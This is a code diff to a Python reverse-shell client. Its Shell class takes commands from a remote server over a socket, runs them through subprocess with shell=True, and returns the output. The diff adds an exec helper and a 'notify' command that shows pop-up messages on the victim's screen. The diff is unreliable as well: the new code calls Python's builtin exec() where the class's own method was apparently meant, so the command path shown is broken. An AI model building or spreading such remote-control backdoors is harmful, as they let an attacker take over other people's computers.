@@ -1,3 +1,4 @@
+from encodings import utf_8
 import os
 import socket
 import subprocess
@@ -15,6 +16,20 @@ class Shell:
         '''
         self.sock = sock
 
+    def exec(self, data: str) -> str:
+        '''
+        Executes commands on remote client's shell
+        
+        :param data: Command to send over to client
+        '''
+        
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdout_value = proc.stdout.read() + proc.stderr.read()
+        output_str = str(stdout_value, "UTF-8")
+        
+        return output_str
+        
+    
     def get_shell(self) -> None:
         '''
         Executes received commands from the server and sends the output back through the socket
@@ -29,7 +44,7 @@ class Shell:
                 data = self.sock.recv(1024).decode("UTF-8")
                 data = data.strip('\n')
                 
-                # "Custom" functions
+                # Special cases
                 if data == "quit": # Exits shell
                     break
                 
@@ -37,9 +52,15 @@ class Shell:
                     os.chdir(data[3:])
                     
                 if len(data) > 0: # Executes command
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    stdout_value = proc.stdout.read() + proc.stderr.read()
-                    output_str = str(stdout_value, "UTF-8")
+                    # Custom functions
+                    
+                    # Send a pop-up notification to client
+                    if data[:6] == "notify":
+                        output_str = exec("msg %username% {}".format(data[7:]))
+                    
+                    else:
+                        # Executes command
+                        output_str = exec(data)
                     
                     #Sends output back to server
                     self.sock.send(str.encode("\n" + output_str))
